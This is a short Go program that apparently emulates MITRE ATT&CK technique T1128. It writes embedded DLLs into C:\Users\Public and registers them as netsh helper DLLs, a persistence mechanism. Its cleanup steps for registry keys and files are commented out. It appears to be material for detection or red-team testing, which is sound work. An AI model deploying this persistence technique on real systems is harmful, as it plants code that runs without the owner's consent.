package main

import (
	"fmt"
	// "log"
	"os/exec"
	// "time"

	"./bindata"
	// "golang.org/x/sys/windows/registry"
)

func main() {
	bindata.RestoreAssets(`C:\Users\Public\`, "t1128_x64.dll")
	bindata.RestoreAssets(`C:\Users\Public\`, "t1128_x86.dll")

	cmd_x64 := exec.Command("netsh", "add", "helper", "C:\\Users\\Public\\t1128_x64.dll")
	out1, err := cmd_x64.Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(out1))
	cmd_x86 := exec.Command("netsh", "add", "helper", "C:\\Users\\Public\\t1128_x86.dll")
	out2, err := cmd_x86.Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(out2))
	// time.Sleep(time.Duration(2) * time.Second)
	// kill_cmd := exec.Command("taskkill.exe", "/f", "/im", "Calculator.exe")
	// kill_cmd.Start()
	// time.Sleep(time.Duration(2) * time.Second)
	// key1, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\NetSh`, registry.ALL_ACCESS)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// defer key1.Close()
	// key1.DeleteValue("t1128_x64")
	// key1.DeleteValue("t1128_x86")
	// time.Sleep(time.Duration(2) * time.Second)
	// exec.Command("cmd.exe", `/c del C:\Users\Public\t1128_x64.dll`).Start()
	// exec.Command("cmd.exe", `/c del C:\Users\Public\t1128_x86.dll`).Start()
}
